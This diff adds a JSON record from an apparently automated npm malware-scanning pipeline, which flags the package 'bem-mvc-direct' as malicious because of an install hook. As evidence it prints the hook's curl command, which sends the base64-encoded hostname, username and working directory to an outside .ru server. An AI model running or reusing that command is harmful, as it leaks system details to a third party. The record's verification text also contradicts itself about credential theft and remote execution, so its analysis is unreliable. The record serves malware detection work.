@@ -1,0 +1,53 @@
+{
+  "package_name": "bem-mvc-direct",
+  "version": "1.11.4",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "install_hook"
+    ],
+    "behaviors": [
+      {
+        "category": "install_hook",
+        "summary": "The package contains an install hook that may execute remote code at install time.",
+        "details": "The install hook command listed in the package metadata above sends a 'meow!securitytest' payload to a remote server.",
+        "confidence": 0.72,
+        "evidence_commands": [
+          "curl-H\"Package:bem-mvc-direct\"-H\"Version:1.11.4\"-H\"Hostname:$(hostname|base64)\" -H\"Whoami:$(whoami|base64)\" -H\"Pwd:$(pwd|base64)\" -d\"meow!securitytest\" http://npm-new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "Obfuscation reads environment credentials, POSTs to external domain, install hook downloads remote script and executes it",
+      "chain_score": 0.71
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package does not seem to exfiltrate tokens or run shell commands, but it could be used as a part of a legitimate deployment tool using child_process",
+      "legitimacy_score": 0.4
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.5,
+      "explanation": "The detected behaviors seem to form a coherent attack chain and they are not justified by the package's stated purpose. However, the package could be used as a legitimate part of a deployment tool using child_process"
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T10:03:04.114934"
+}
